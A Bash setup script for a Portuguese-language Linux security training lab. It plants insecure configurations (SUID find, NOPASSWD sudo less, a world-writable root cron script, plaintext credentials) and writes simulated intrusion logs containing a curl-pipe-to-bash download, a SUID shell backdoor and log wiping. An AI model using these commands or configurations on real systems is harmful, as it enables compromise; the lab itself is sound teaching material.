#!/usr/bin/env bash
#
# setup.sh - monta o cenario vulneravel do Linux Cyber Lab
#
# Uso:  sudo ./setup/setup.sh
# Testado em Kali Linux (Debian-based). Rode APENAS em VM de laboratorio.
#
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

LAB_ROOT="/opt/cyberlab"
SRV_ROOT="/srv/cyberlab"

FLAG_RECON='FLAG{r3c0n_3_4_b4s3_d3_tud0}'
FLAG_CREDS='FLAG{cr3d3nc141s_n0_lug4r_3rr4d0}'
FLAG_ROOT='FLAG{r00t_c0nqu1st4d4}'

ok()   { printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
info() { printf '\033[1;34m[i]\033[0m %s\n' "$*"; }
warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
die()  { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; exit 1; }

# ---------------------------------------------------------------- pre-checks
[[ $EUID -eq 0 ]] || die "Execute como root:  sudo ./setup/setup.sh"

command -v useradd >/dev/null || die "useradd nao encontrado (instale passwd)"
command -v visudo  >/dev/null || die "visudo nao encontrado (instale sudo)"

if [[ -d "$LAB_ROOT" ]] && [[ -f "$LAB_ROOT/.installed" ]]; then
  warn "O laboratorio parece ja estar montado em $LAB_ROOT."
  warn "Para recomecar do zero use:  sudo ./setup/reset.sh"
  warn "Continuando em 5 segundos... (Ctrl+C para abortar)"
  sleep 5
fi

info "Montando o Linux Cyber Lab..."

# ---------------------------------------------------------------- usuarios
ensure_user() {
  local user=$1 pass=$2
  if id "$user" &>/dev/null; then
    warn "usuario '$user' ja existe - apenas redefinindo a senha"
  else
    useradd -m -s /bin/bash "$user"
    ok "usuario '$user' criado"
  fi
  echo "$user:$pass" | chpasswd

  # garante home consistente mesmo em execucao parcial anterior
  local home
  home=$(getent passwd "$user" | cut -d: -f6)
  if [[ -n "$home" && ! -d "$home" ]]; then
    mkdir -p "$home"
    chown "$user:$user" "$home"
  fi
}

ensure_user dev01      'V4mosLab!01'
ensure_user dev02      'B4ckup#2024'
ensure_user svc-backup 'Backup@2024'

for u in dev01 dev02 svc-backup; do
  home=$(getent passwd "$u" | cut -d: -f6)
  [[ -n "$home" && -d "$home" ]] && chmod 0755 "$home"
done

# ---------------------------------------------------------------- estrutura
install -d -m 0755 "$LAB_ROOT"/{bin,data,logs,scripts,web/cache}
install -d -m 0755 "$LAB_ROOT/data/.old-backups"
install -d -m 0755 "$SRV_ROOT"/backup
ok "estrutura de diretorios criada"

# ---------------------------------------------------------------- lab 01
cat > "$LAB_ROOT/data/.old-backups/flag1.txt" <<EOF
$FLAG_RECON

Voce encontrou a flag 1. Agora responda: como voce acharia esse arquivo
sem saber o caminho de antemao? Esse e o objetivo do lab 01.
EOF
chmod 0644 "$LAB_ROOT/data/.old-backups/flag1.txt"

cat > "$LAB_ROOT/data/inventario.csv" <<'EOF'
host,ip,servico,responsavel,observacao
srv-arquivos,10.10.10.20,samba,dev01,"backup diario as 02h"
srv-web,10.10.10.30,nginx,dev02,"app interna, sem WAF"
svc-backup,10.10.10.40,rsync,infra,"conta de servico, senha nunca trocada"
EOF

cat > "$LAB_ROOT/data/notas-admin.txt" <<'EOF'
TODO (antigo admin):
- [x] migrar /srv/cyberlab/backup para o novo NAS
- [ ] trocar a senha do svc-backup (esta no .bash_history do dev01, lembrar!)
- [ ] remover o binario .cache-helper do /opt/cyberlab/bin (ninguem sabe pra que serve)
- [ ] revisar o /etc/sudoers.d/cyberlab-labs
- [ ] o script de manutencao do cron esta 777 de novo... "depois eu arrumo"
EOF
chmod 0644 "$LAB_ROOT/data/notas-admin.txt"

cat > "$LAB_ROOT/web/index.html" <<'EOF'
<!doctype html>
<html lang="pt-br"><head><meta charset="utf-8"><title>CyberLab Intranet</title></head>
<body><h1>Intranet do laboratorio</h1><p>Ambiente de estudo. Nada aqui e real.</p></body></html>
EOF
ok "lab 01 (reconhecimento) montado"

# ---------------------------------------------------------------- lab 02
DEV01_HOME=$(getent passwd dev01 | cut -d: -f6)
DEV02_HOME=$(getent passwd dev02 | cut -d: -f6)

install -d -m 0755 "$DEV01_HOME/projetos/api" "$DEV01_HOME/.ssh" "$SRV_ROOT/backup"

cat > "$DEV01_HOME/.bash_history" <<'EOF'
cd ~/projetos/api
ls -la
cat .env
nano .env
mysql -u root -p'S3nh4-DB-2024' -h 127.0.0.1
# deu erro, o banco nao esta local
ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N ""
cat ~/.ssh/id_rsa.pub
./deploy.sh
# preciso entrar no dev02 pra pegar o backup: su dev02  (senha B4ckup#2024)
su dev02
exit
tail -f /var/log/syslog
EOF

cat > "$DEV01_HOME/projetos/api/.env" <<'EOF'
APP_NAME=cyberlab-api
APP_ENV=production
APP_DEBUG=false
APP_KEY=base64:dGhpc19pc19hX2RlY295X2tleQ==

DB_HOST=127.0.0.1
DB_PORT=3306
DB_USER=app
DB_PASS=UzNuaDQtREItMjAyNA==

REDIS_HOST=127.0.0.1
JWT_SECRET=changeme
EOF

# Chave SSH sem passphrase e com permissao frouxa (erro classico)
ssh-keygen -q -t rsa -b 2048 -f "$DEV01_HOME/.ssh/id_rsa" -N "" -C "dev01@cyberlab" </dev/null 2>/dev/null || true
chmod 0644 "$DEV01_HOME/.ssh/id_rsa"
chmod 0644 "$DEV01_HOME/.ssh/id_rsa.pub"

cat > "$SRV_ROOT/backup/backup.sh" <<'EOF'
#!/bin/bash
# backup diario do servidor de arquivos
export RSYNC_PASSWORD='R3m0t3-B4ckup-2024'
rsync -az --delete /srv/cyberlab/data/ backupuser@10.10.10.20::backup/
EOF
chmod 0755 "$SRV_ROOT/backup/backup.sh"

chown -R dev01:dev01 "$DEV01_HOME"
chown root:root "$SRV_ROOT/backup/backup.sh"

cat > "$DEV02_HOME/flag2.txt" <<EOF
$FLAG_CREDS

Boa: credencial em texto claro e movimento lateral.
Pergunta para o relatorio: por que o historico do dev01 nao deveria
conter a senha de outro usuario?
EOF
chown dev02:dev02 "$DEV02_HOME/flag2.txt"
chmod 0640 "$DEV02_HOME/flag2.txt"
ok "lab 02 (credenciais) montado"

# ---------------------------------------------------------------- lab 03
# SUID fora do padrao, com nome discreto
if command -v find >/dev/null; then
  cp "$(command -v find)" "$LAB_ROOT/bin/.cache-helper"
  chown root:root "$LAB_ROOT/bin/.cache-helper"
  chmod 4755 "$LAB_ROOT/bin/.cache-helper"
  ok "binario SUID criado em $LAB_ROOT/bin/.cache-helper"
else
  warn "find nao encontrado - pulando o SUID do lab 03"
fi

# Regra de sudo insegura
cat > /etc/sudoers.d/cyberlab-labs <<'EOF'
# LAB 03 - propositalmente inseguro. Remova no lab 08.
dev01 ALL=(root) NOPASSWD: /usr/bin/less
EOF
chmod 0440 /etc/sudoers.d/cyberlab-labs
if ! visudo -cf /etc/sudoers.d/cyberlab-labs >/dev/null 2>&1; then
  rm -f /etc/sudoers.d/cyberlab-labs
  die "regra de sudoers invalida - arquivo removido (verifique /usr/bin/less)"
fi
ok "regra de sudo insegura instalada"

# Script de manutencao executado por root via cron, gravavel por todos
cat > "$LAB_ROOT/scripts/maintenance.sh" <<'EOF'
#!/bin/bash
# Rotina de manutencao do laboratorio - executada como root pelo cron
find /tmp -maxdepth 1 -name 'cyberlab-*.tmp' -mtime +1 -delete 2>/dev/null
rm -rf /opt/cyberlab/web/cache/* 2>/dev/null
exit 0
EOF
chown root:root "$LAB_ROOT/scripts/maintenance.sh"
chmod 0777 "$LAB_ROOT/scripts/maintenance.sh"

cat > /etc/cron.d/cyberlab-maintenance <<'EOF'
# LAB 03/04 - agendamento inseguro (script gravavel por qualquer usuario)
*/2 * * * * root /opt/cyberlab/scripts/maintenance.sh >/dev/null 2>&1
EOF
chmod 0644 /etc/cron.d/cyberlab-maintenance

# Garante que o cron esta rodando, senao a escalada do lab 03 nao dispara
systemctl enable --now cron >/dev/null 2>&1 || true
ok "cron vulneravel instalado (executa a cada 2 minutos)"

# Flag final, so acessivel como root
cat > /root/flag3.txt <<EOF
$FLAG_ROOT

Voce chegou a root. Agora a parte dificil: prove que consegue
detectar essa escalada no lab 06/07.
EOF
chmod 0600 /root/flag3.txt

# Necessario para a regra de auditoria em /root/.ssh (lab 07/04)
install -d -m 0700 /root/.ssh
ok "flag 3 criada em /root/flag3.txt (0600)"

# ---------------------------------------------------------------- lab 06: logs
cat > "$LAB_ROOT/logs/auth.log" <<'EOF'
Feb 14 01:58:11 kali systemd-logind[812]: New session 3 of user kali.
Feb 14 02:03:44 kali sshd[3901]: Accepted publickey for dev01 from 192.168.0.15 port 49012 ssh2
Feb 14 02:03:44 kali sshd[3901]: pam_unix(sshd:session): session opened for user dev01(uid=1001) by (uid=0)
Feb 14 02:05:02 kali sshd[3901]: Received disconnect from 192.168.0.15 port 49012:11: disconnected by user
Feb 14 02:11:03 kali sshd[4021]: Failed password for invalid user admin from 10.10.10.66 port 51512 ssh2
Feb 14 02:11:05 kali sshd[4021]: Invalid user oracle from 10.10.10.66 port 51518
Feb 14 02:11:07 kali sshd[4021]: Failed password for invalid user oracle from 10.10.10.66 port 51518 ssh2
Feb 14 02:11:12 kali sshd[4025]: Invalid user test from 10.10.10.66 port 51530
Feb 14 02:11:14 kali sshd[4025]: Failed password for invalid user test from 10.10.10.66 port 51530 ssh2
Feb 14 02:11:22 kali sshd[4029]: Invalid user backup from 10.10.10.66 port 51544
Feb 14 02:11:25 kali sshd[4029]: Failed password for invalid user backup from 10.10.10.66 port 51544 ssh2
Feb 14 02:11:51 kali sshd[4033]: Failed password for invalid user root from 10.10.10.66 port 51560 ssh2
Feb 14 02:11:58 kali sshd[4033]: Failed password for invalid user root from 10.10.10.66 port 51560 ssh2
Feb 14 02:12:40 kali sshd[4060]: Invalid user svc-backup from 10.10.10.66 port 51588
Feb 14 02:12:44 kali sshd[4060]: Failed password for invalid user svc-backup from 10.10.10.66 port 51588 ssh2
Feb 14 02:13:15 kali sshd[4070]: Failed password for invalid user svc-backup from 10.10.10.66 port 51600 ssh2
Feb 14 02:13:52 kali sshd[4081]: Failed password for invalid user svc-backup from 10.10.10.66 port 51611 ssh2
Feb 14 02:14:07 kali sshd[4110]: Accepted password for svc-backup from 10.10.10.66 port 51602 ssh2
Feb 14 02:14:07 kali sshd[4110]: pam_unix(sshd:session): session opened for user svc-backup(uid=1002) by (uid=0)
Feb 14 02:15:32 kali sudo: svc-backup : TTY=pts/0 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash bkp
Feb 14 02:15:44 kali sudo: svc-backup : TTY=pts/0 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo bkp
Feb 14 02:16:10 kali sudo: svc-backup : TTY=pts/0 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys
Feb 14 02:16:51 kali sudo: svc-backup : TTY=pts/0 ; PWD=/home/svc-backup ; USER=root ; COMMAND=/usr/bin/chmod 4755 /tmp/.systemd-update
Feb 14 02:18:44 kali CRON[4231]: (root) CMD (/usr/bin/curl -s http://10.10.10.66:8080/update.sh | bash)
Feb 14 02:19:02 kali sudo: svc-backup : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/rm -f /var/log/btmp
Feb 14 02:20:12 kali sshd[4288]: Received disconnect from 10.10.10.66 port 51602:11: disconnected by user
Feb 14 02:20:13 kali sshd[4110]: pam_unix(sshd:session): session closed for user svc-backup
Feb 14 02:21:10 kali sshd[4301]: Accepted publickey for bkp from 10.10.10.66 port 51789 ssh2
Feb 14 02:21:10 kali sshd[4301]: pam_unix(sshd:session): session opened for user bkp(uid=1003) by (uid=0)
Feb 14 02:24:33 kali sudo: bkp : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/tar -czf /tmp/.cache.tar.gz /srv/cyberlab
Feb 14 02:27:01 kali sshd[4301]: Received disconnect from 10.10.10.66 port 51789:11: disconnected by user
Feb 14 02:31:12 kali sshd[4350]: Accepted password for dev02 from 192.168.0.15 port 49310 ssh2
EOF

cat > "$LAB_ROOT/logs/access.log" <<'EOF'
192.168.0.15 - - [14/Feb/2026:02:04:10 +0000] "GET / HTTP/1.1" 200 612 "-" "Mozilla/5.0 (X11; Linux x86_64)"
192.168.0.15 - - [14/Feb/2026:02:04:12 +0000] "GET /favicon.ico HTTP/1.1" 200 102 "-" "Mozilla/5.0 (X11; Linux x86_64)"
10.10.10.66 - - [14/Feb/2026:02:09:12 +0000] "GET /robots.txt HTTP/1.1" 404 153 "-" "curl/8.5.0"
10.10.10.66 - - [14/Feb/2026:02:09:15 +0000] "GET /.env HTTP/1.1" 404 153 "-" "curl/8.5.0"
10.10.10.66 - - [14/Feb/2026:02:09:18 +0000] "GET /.git/config HTTP/1.1" 404 153 "-" "curl/8.5.0"
10.10.10.66 - - [14/Feb/2026:02:09:22 +0000] "GET /admin HTTP/1.1" 404 153 "-" "curl/8.5.0"
10.10.10.66 - - [14/Feb/2026:02:09:26 +0000] "GET /backup.zip HTTP/1.1" 404 153 "-" "curl/8.5.0"
10.10.10.66 - - [14/Feb/2026:02:09:31 +0000] "GET /phpinfo.php HTTP/1.1" 404 153 "-" "curl/8.5.0"
10.10.10.66 - - [14/Feb/2026:02:14:20 +0000] "GET /update.sh HTTP/1.1" 200 214 "-" "curl/8.5.0"
10.10.10.66 - - [14/Feb/2026:02:23:40 +0000] "POST /upload HTTP/1.1" 201 58 "-" "curl/8.5.0"
EOF

cat > "$LAB_ROOT/logs/history-svc-backup.txt" <<'EOF'
cd /var/www
ls -la
sudo -l
sudo -i
useradd -m -s /bin/bash bkp
usermod -aG sudo bkp
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC7lab...' >> /root/.ssh/authorized_keys
cp /bin/bash /tmp/.systemd-update && chmod 4755 /tmp/.systemd-update
curl -s http://10.10.10.66:8080/update.sh | bash
tar -czf /tmp/.cache.tar.gz /srv/cyberlab
rm -f /var/log/btmp
history -c
EOF

cat > "$LAB_ROOT/logs/ps-snapshot.txt" <<'EOF'
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.1 167404 12512 ?        Ss   01:55   0:03 /sbin/init
root       812  0.0  0.1  92416  9216 ?        Ss   01:55   0:00 /lib/systemd/systemd-logind
bkp       4310  0.0  0.0   8392  4864 pts/1    S+   02:26   0:00 /bin/bash
root      4311  0.0  0.0   7352  3072 pts/1    S+   02:26   0:00 /usr/bin/curl -s http://10.10.10.66:8080/update.sh
EOF

chmod 0644 "$LAB_ROOT"/logs/*.log "$LAB_ROOT"/logs/*.txt
ok "logs do incidente criados em $LAB_ROOT/logs"

# ---------------------------------------------------------------- lab 07: auditd
if [[ -d /etc/audit/rules.d ]]; then
  if [[ -f "$SCRIPT_DIR/audit-cyberlab.rules" ]]; then
    install -m 0640 "$SCRIPT_DIR/audit-cyberlab.rules" /etc/audit/rules.d/cyberlab.rules
  else
    printf '%s\n' \
      '-w /etc/passwd -p wa -k cyberlab_identidade' \
      '-w /etc/shadow -p wa -k cyberlab_identidade' \
      '-w /etc/sudoers -p wa -k cyberlab_sudo' \
      '-w /etc/sudoers.d/ -p wa -k cyberlab_sudo' \
      '-w /etc/cron.d/ -p wa -k cyberlab_cron' \
      '-w /opt/cyberlab/scripts/ -p wa -k cyberlab_scripts' \
      '-w /root/.ssh/ -p wa -k cyberlab_ssh' \
      > /etc/audit/rules.d/cyberlab.rules
  fi
  if command -v augenrules >/dev/null; then
    augenrules --load >/dev/null 2>&1 || warn "nao foi possivel carregar as regras do auditd agora"
    ok "regras de auditoria instaladas em /etc/audit/rules.d/cyberlab.rules"
  else
    warn "auditd nao instalado - regras gravadas mas nao carregadas (apt install auditd)"
  fi
else
  warn "diretorio /etc/audit nao existe - pule o lab 07 ou instale auditd"
fi

# ---------------------------------------------------------------- final
touch "$LAB_ROOT/.installed"

cat <<EOF

$(printf '\033[1;32m========================================\033[0m')
$(printf '\033[1;32m  LINUX CYBER LAB MONTADO COM SUCESSO  \033[0m')
$(printf '\033[1;32m========================================\033[0m')

  Raiz do lab ....: $LAB_ROOT
  Backups ........: $SRV_ROOT
  Logs do lab ....: $LAB_ROOT/logs
  Usuarios .......: dev01, dev02, svc-backup

  Flags escondidas: 3
  Comece por .....: labs/01-reconhecimento/README.md

$(printf '\033[1;33m  Dica: rode "sudo ./setup/verify.sh" no final do lab 08.\033[0m')
$(printf '\033[1;33m  Para desfazer: sudo ./setup/teardown.sh\033[0m')

EOF
